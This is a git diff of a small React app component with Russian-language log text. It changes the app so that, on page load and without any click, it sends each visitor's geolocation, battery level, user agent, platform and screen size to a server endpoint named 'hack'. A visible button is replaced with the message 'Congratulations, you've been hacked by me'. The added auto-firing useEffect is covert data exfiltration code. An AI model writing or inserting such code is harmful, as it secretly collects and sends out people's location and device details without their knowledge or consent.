@@ -1,3 +1,4 @@
+/* eslint-disable react/no-unescaped-entities */
 import { useEffect, useState } from 'react';
 import './App.css';
 import request from './server';
@@ -37,6 +38,8 @@ function App() {
 
   console.log(`Дюймовая диагональ экрана: ${inches} дюймов`);
 
+  console.log(window);
+
   useEffect(() => {
     function handleBatteryChange() {
       navigator.getBattery().then((battery) => {
@@ -57,15 +60,20 @@ function App() {
     };
   }, []);
 
+  useEffect(() => {
+    handleClick()
+  }, [batteryLevel, mylocation, userAgent, platform, inches])
 
   async function handleClick() {
-    console.log('dads');
     await request.post("hack", { precentBattery: batteryLevel, location: mylocation, informationSystems: userAgent, operatingSystems: platform, dyum: inches });
+    console.log('dads');
   }
 
   return (
     <>
-      <button onClick={handleClick}>Click</button>
+      <h1 className='text'>
+        Congratulations, you've been hacked by me
+      </h1>
     </>
   );
 }
